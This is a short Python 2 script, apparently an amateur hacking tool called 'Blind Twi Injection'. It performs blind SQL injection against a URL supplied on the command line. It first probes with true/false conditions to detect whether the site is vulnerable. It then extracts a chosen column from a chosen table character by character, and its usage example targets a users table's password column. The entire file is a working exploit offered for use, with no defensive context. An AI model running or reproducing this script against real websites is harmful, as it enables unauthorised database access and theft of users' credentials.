#!/usr/bin/python

import urllib,sys

banner = """
  ____        _______       _____
|  _ \      |__   __|     |_   _|
| |_) |        | |          | | 
|  _ <         | |          | | 
| |_) |  _     | |     _   _| |_
|____/  (_)    |_|    (_) |_____|
------------------------------------
        Blind Twi Injection         
------------------------------------
        Coded By Twi John                       
"""
print banner

if len(sys.argv) != 5:
   print "Usage: %s <url> <table> <column> <max-caracters>" % sys.argv[0]
   print "Ex: %s http://www.site.com/news.php?id=1 users password 7\n" % sys.argv[0]
   sys.exit(0)

url = sys.argv[1]
table = sys.argv[2]
column = sys.argv[3]
n = int(sys.argv[4])


def bsqli():
   print ("\n[+]Started\n")
   word = ""
   n1 = n + 1
   for n3 in range(1,n1):
      for i in range(97,127):
         f = urllib.urlopen(url+"+and+ascii(substring((select+concat("+column+")+from+"+table+"+limit+0,1),+"+str(n3)+",1))="+str(i))
         code3 = f.read()
         if (code3 == code):
            word = word+chr(i)
            break
   print "Result: " + word
   
f = urllib.urlopen(url+"+and+1=1--")
code = f.read()
f = urllib.urlopen(url+"and+1=0--")
code1 = f.read()
if (code != code1):
   print("Vulnerable!")
else:
   print("This website is not vulnerable!")
      
res = raw_input("Continue[y]: ")
if res == "y" or "Y":
   bsqli()
else:
   sys.exit()